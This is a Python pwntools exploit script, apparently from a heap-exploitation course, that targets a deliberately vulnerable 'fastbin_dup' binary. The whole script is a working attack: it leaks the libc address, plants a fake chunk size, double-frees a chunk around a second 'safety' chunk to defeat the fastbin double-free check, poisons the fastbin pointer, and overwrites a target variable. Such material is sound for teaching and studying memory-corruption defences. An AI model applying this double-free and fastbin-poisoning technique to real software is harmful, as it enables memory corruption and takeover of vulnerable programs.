#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# The second qword of the "username" field will act as a fake chunk size field.
# Set it to 0x21, the size of the chunk being duplicated in this solution.
username = p64(0) + p64(0x21)
io.sendafter("username: ", username)
io.recvuntil("> ")

# Request two chunks with size 0x20, the same as the fake size field in "username".
# The "dup" chunk will be duplicated, the "safety" chunk is used to bypass the fastbins double-free mitigation.
dup = malloc(0x18, "A"*8)
safety = malloc(0x18, "B"*8)

# Use the double-free bug to free the "dup" chunk, then the "safety" chunk, then the "dup" chunk again.
# This way the "dup" chunk is not at the head of the 0x20 fastbin when it is freed for the second time,
# bypassing the fastbins double-free mitigation.
free(dup)
free(safety)
free(dup)

# The next request for a 0x20-sized chunk will be serviced by the "dup" chunk.
# Request it, then overwrite its fastbin fd, pointing it to the fake chunk in "username".
malloc(0x18, p64(elf.sym.user))

# Make two more requests for 0x20-sized chunks. The "safety" chunk, then the "dup" chunk are allocated to
# service these requests.
malloc(0x18, "C"*8)
malloc(0x18, "D"*8)

# The next request for a 0x20-sized chunk is serviced by the fake chunk in "username".
# The first qword of its user data overlaps the target data.
malloc(0x18, "Much win")

# Confirm the target data was overwritten.
io.sendthen("target: ", "3")
target_data = io.recvuntil("\n", True)
assert target_data == b"Much win"
io.recvuntil("> ")

# =============================================================================

io.interactive()
